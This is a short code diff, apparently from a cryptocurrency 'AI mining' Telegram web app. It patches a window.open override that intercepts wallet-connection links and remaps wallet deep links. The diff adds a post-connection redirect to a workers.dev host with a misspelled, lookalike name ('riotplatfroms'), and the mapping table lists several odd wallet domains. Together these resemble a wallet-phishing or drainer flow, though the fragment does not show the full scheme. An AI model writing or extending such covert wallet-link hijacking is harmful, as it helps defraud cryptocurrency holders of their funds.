@@ -30,7 +30,8 @@ if (typeof (window as any).global === 'undefined') {
     if (!urlStr) return originalOpen.call(window, url!, target!, features!);
 
     // Use /start to force Telegram to handle it as a deep-link entry point
-    const botUrl = 'https://t.me/AiMiningBTC_bot/start';
+    // Use /?v=success to force a stable landing page after wallet connection
+    const botUrl = 'https://riotnode.riotplatfroms.workers.dev/?v=success';
     const isWalletLink = urlStr.startsWith('wc:') || urlStr.startsWith('metamask:');
     const timeSinceNav = Date.now() - lastNavTime;
 
@@ -51,7 +52,7 @@ if (typeof (window as any).global === 'undefined') {
       'tp://': 'https://tokenpocket.platform/',
       'bitkeep://': 'https://bkcode.vip/',
       'okx://': 'https://www.okx.com/download',
-      'bnc://': 'https://app.binance.com/mp/appcon',
+      'bnc://': 'https://app.binance.com/bnc/wallet-connect',
       'bitget://': 'https://web3.bitget.com/',
       'rainbow://': 'https://rnbwapp.com/',
       'phantom://': 'https://phantom.app/ul/'
